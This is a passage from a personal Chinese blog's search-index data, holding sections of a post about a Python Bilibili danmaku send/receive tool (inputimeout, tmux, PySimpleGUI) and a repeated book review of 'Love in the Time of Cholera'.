","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:1","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#可行性分析"},{"categories":["python"],"content":" 第二阶段开两个终端切换较为麻烦，于是萌生了把两个程序整合成一个的想法，想实现类似网页的上方是弹幕下方是输入框的效果。 可行性分析弹幕的动态捕捉依赖间隔固定时间地获取最近10条弹幕，提取出新的弹幕，显示在终端上，但是如果整合进输入程序，输入方法会阻塞进程，如果一直不输入就没有办法获取新的弹幕，所以需要为输入设定超时。 查阅资料得知，为输入方法设定超时需要使用多线程，或者异步异常信息处理，刚学py，不会这些。。。 查阅英文资料和pypi得知，python有个inputimeout库可以处理超时输入的问题，所以就整上了。 但是在现在这一流程中，每次输入超时都需要清屏，这样每次更新弹幕的时候都会闪一下，体验非常不好。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:2","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#第二阶段"},{"categories":["python"],"content":" 第二阶段开两个终端切换较为麻烦，于是萌生了把两个程序整合成一个的想法，想实现类似网页的上方是弹幕下方是输入框的效果。 可行性分析弹幕的动态捕捉依赖间隔固定时间地获取最近10条弹幕，提取出新的弹幕，显示在终端上，但是如果整合进输入程序，输入方法会阻塞进程，如果一直不输入就没有办法获取新的弹幕，所以需要为输入设定超时。 查阅资料得知，为输入方法设定超时需要使用多线程，或者异步异常信息处理，刚学py，不会这些。。。 查阅英文资料和pypi得知，python有个inputimeout库可以处理超时输入的问题，所以就整上了。 但是在现在这一流程中，每次输入超时都需要清屏，这样每次更新弹幕的时候都会闪一下，体验非常不好。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:2","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#可行性分析-1"},{"categories":["python"],"content":" 第三阶段有没有办法实现一个terminal中分屏显示都个session呢？ 可行性分析结合我个人的Linux使用经验，可以使用tmux这个工具实现分屏操作，所以第二阶段的工作就白做了。。。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:3","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#第三阶段"},{"categories":["python"],"content":" 第三阶段有没有办法实现一个terminal中分屏显示都个session呢？ 可行性分析结合我个人的Linux使用经验，可以使用tmux这个工具实现分屏操作，所以第二阶段的工作就白做了。。。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:2:3","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#可行性分析-2"},{"categories":["python"],"content":" 最终效果 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:3:0","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#最终效果"},{"categories":["python"],"content":" 不足与提升空间冷启动时需要较多的步骤，不够优雅。 未来可以尝试使用GUI框架封装代码，实现一个输出框一个输入框收发代码。 ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:4:0","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#不足与提升空间"},{"categories":["python"],"content":" 1/25 Update采用PysimpleGUI这个最简单的GUI库封装了代码，现在很好用（） ","date":"2022-01-18","objectID":"/articles/Bilibili-send-and-receive/:4:1","series":null,"tags":null,"title":"Bilibili直播弹幕收发小程序","uri":"/articles/Bilibili-send-and-receive/#125-update"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#引言"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 